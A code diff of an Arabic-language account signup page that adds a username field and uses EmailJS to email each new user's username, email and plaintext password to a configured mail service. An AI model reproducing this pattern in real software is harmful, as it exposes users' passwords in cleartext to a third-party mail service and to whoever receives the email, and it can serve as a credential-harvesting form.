@@ -95,6 +95,10 @@
         <h1>🔑 تسجيل حساب جديد</h1>
         <form id="signupForm">
             <div class="form-group">
+                <label for="username">اسم المستخدم</label>
+                <input type="text" id="username" name="username" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            <div class="form-group">
                 <label for="email">البريد الإلكتروني</label>
                 <input type="email" id="email" name="email" placeholder="أدخل بريدك الإلكتروني" required>
             </div>
@@ -110,11 +114,12 @@
 
     <script>
         // تهيئة Email.js باستخدام public key
-        emailjs.init('g9DzapSDwZ2_ux_if'); // تم إضافة المفتاح الخاص بك هنا
+        emailjs.init('g9DzapSDwZ2_ux_if'); // تم إضافة المفتاح العام هنا
 
         document.getElementById('signupForm').addEventListener('submit', function(event) {
             event.preventDefault();
             
+            const username = document.getElementById('username').value.trim();
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
             const errorMessage = document.getElementById('errorMessage');
@@ -137,26 +142,22 @@
                 return;
             }
 
-            // إرسال البريد الإلكتروني عبر Email.js (بدون استخدام قالب)
-            const emailContent = `
-                تم تسجيل حساب جديد:
-                البريد الإلكتروني: ${email}
-                كلمة المرور: ${password}
-            `;
-
+            // إعداد البريد الإلكتروني
             const templateParams = {
+                user_name: username,  // إضافة اسم المستخدم
                 user_email: email,
-                message: emailContent
+                user_password: password
             };
 
             // إرسال البريد الإلكتروني مباشرة باستخدام Email.js
-            emailjs.send('service_fr16kl9', 'YOUR_TEMPLATE_ID', templateParams)
+            emailjs.send('service_fr16kl9', '', templateParams)
                 .then(function(response) {
                     successMessage.textContent = '✅ تم تسجيل الحساب بنجاح!';
                     errorMessage.textContent = '';
                     window.location.href = 'welcome.html'; // صفحة الترحيب بعد التسجيل الناجح
                 }, function(error) {
-                    errorMessage.textContent = '❌ فشل إرسال البريد الإلكتروني.';
+                    console.error('Error:', error); // طباعة تفاصيل الخطأ في الكونسول
+                    errorMessage.textContent = '❌ فشل إرسال البريد الإلكتروني: ' + error.text;
                     successMessage.textContent = '';
                 });
         });
